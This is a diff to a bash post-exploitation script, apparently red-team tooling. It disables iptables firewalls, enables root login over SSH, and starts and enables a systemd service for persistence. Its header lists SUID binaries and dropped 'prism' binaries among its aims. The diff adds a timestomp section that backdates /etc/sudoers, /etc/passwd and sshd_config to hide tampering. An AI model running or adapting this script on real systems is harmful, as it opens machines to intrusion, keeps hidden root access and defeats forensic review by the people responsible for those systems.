@@ -10,6 +10,7 @@
 #	- SUID bins
 #	- Drop prism bins
 #	- Establish systemd persistence
+#	- Timestomp
 
 
 # Check Release to see if Ubuntu/CentOS
@@ -26,7 +27,7 @@ then
 	#chkconfig iptables off &>/dev/null
 
 	# NEW
-	iptables -X & /dev/null
+	iptables -X &> /dev/null
     	iptables -F &> /dev/null
     	iptables -t nat -F &> /dev/null
     	iptables -t nat -X &> /dev/null
@@ -57,7 +58,7 @@ then
 	#echo "Ubuntu" > /root/version.txt
 	
 	### DISABLE FIREWALL ON UBUNTU ###
-	iptables -X & /dev/null
+	iptables -X &> /dev/null
         iptables -F &> /dev/null
         iptables -t nat -F &> /dev/null
         iptables -t nat -X &> /dev/null
@@ -83,7 +84,11 @@ fi
 #===============================================================================
 
 # Enable Root login over ssh
-sed 's/#\?\(PermitRootLogin\s*\).*$/\1 yes/' /etc/ssh/sshd_config > /tmp/asdasd
+if [[ -f /etc/ssh/sshd_config ]]
+then
+	sed 's/#\?\(PermitRootLogin\s*\).*$/\1 yes/' /etc/ssh/sshd_config > /tmp/asdasd
+fi
+
 mv /tmp/asdasd /etc/ssh/sshd_config
 rm -f /tmp/asdasd
 
@@ -199,11 +204,18 @@ touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
 systemctl start filesys.service
 systemctl enable filesys.service
 
+# TIMESTOMP
+touch -a --date "2020-3-20 20:51:30" /etc/sudoers
+touch -m --date "2020-3-20 20:51:30" /etc/sudoers
 
+touch -a --date "2020-3-20 20:51:30" /etc/passwd
+touch -m --date "2020-3-20 20:51:30" /etc/passwd
 
+touch -a --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
+touch -m --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
 
-
+touch -a --date "2020-3-20 20:51:30" /etc/sudoers
+touch -m --date "2020-3-20 20:51:30" /etc/sudoers
 
 
 exit 0
-
